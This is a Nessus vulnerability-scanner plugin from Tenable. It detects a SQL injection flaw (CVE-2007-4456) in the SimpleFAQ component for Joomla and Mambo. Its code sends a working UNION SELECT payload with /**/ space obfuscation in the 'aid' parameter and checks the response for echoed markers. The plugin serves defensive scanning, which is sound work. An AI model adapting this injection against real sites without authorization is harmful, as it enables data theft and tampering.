#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25930);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-4456");
  script_bugtraq_id(25376);
  script_xref(name:"OSVDB", value:"37174");

  script_name(english:"SimpleFAQ Component for Joomla! aid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate answers with SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SimpleFAQ, a third-party Frequently Asked
Questions component for Mambo and Joomla. 

The version of SimpleFAQ installed on the remote host fails to
sanitize input to the 'aid' parameter before using it in the
'showAnswers' function in 'simplephp.php' in a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
attacker may be able to exploit this issue to manipulate such queries,
leading to disclosure of sensitive information, modification of data,
or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4296" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/477174/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
info = "";
contents = "";
foreach dir (dirs)
{
  # Try to exploit the issue.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("-1 UNION SELECT 0,", magic1, ",", magic2, ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  req = http_get(
    item:string(
      dir, "/index.php?",
      "option=com_simplefaq&",
      "task=answer&",
      "Itemid=9999&",
      "catid=99999&",
      "aid=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like SimpleFAQ and...
    '>SimpleFAQ V' >< res &&
    # we see our magic in the answer
    string('</a><b>', magic1, '</b></td>') >< res &&
    string('valign=top>', magic2, '<hr>') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
